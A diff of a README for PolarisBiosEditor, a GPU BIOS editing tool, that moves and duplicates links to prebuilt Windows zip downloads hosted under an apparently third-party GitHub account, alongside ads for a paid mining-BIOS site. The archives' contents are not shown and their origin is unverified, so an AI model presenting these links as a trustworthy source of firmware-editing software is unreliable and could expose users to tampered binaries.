@@ -1,13 +1,10 @@
 # PolarisBiosEditor v1.7.6
 
-[Download PolarisBiosEditor v1.7.6 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor1.7.6.zip)
------------------------------------------------------------------------------------------------------------------
-[Download PolarisBiosEditor v1.7.0 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor170.zip)
------------------------------------------------------------------------------------------------------------------
-[Download PolarisBiosEditor v1.6.7 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor-1.6.7-master.zip)
 -----------------------------------------------------------------------------------------------------------------
 ![image](https://user-images.githubusercontent.com/98729987/212367484-718fe836-2feb-44a9-80fe-57efe1fb668b.png)
 
+[Download PolarisBiosEditor v1.7.6 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor1.7.6.zip)
+-----------------------------------------------------------------------------------------------------------------
 
 ## Buy mining bios with performance timings! https://mining-bios.eu/
 **Polaris Bios Editor 3 PRO https://mining-bios.eu/product/polaris-bios-editor-3-pro-pbe-3-pro-performance-timings/**
@@ -143,3 +140,9 @@ Just change your working directory to the PolarisBiosEditor and execute:
 ```
 ./run.sh
 ```
+
+[Download PolarisBiosEditor v1.7.6 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor1.7.6.zip)
+-----------------------------------------------------------------------------------------------------------------
+[Download PolarisBiosEditor v1.7.0 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor170.zip)
+-----------------------------------------------------------------------------------------------------------------
+[Download PolarisBiosEditor v1.6.7 for Windows](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor-1.6.7-master.zip)
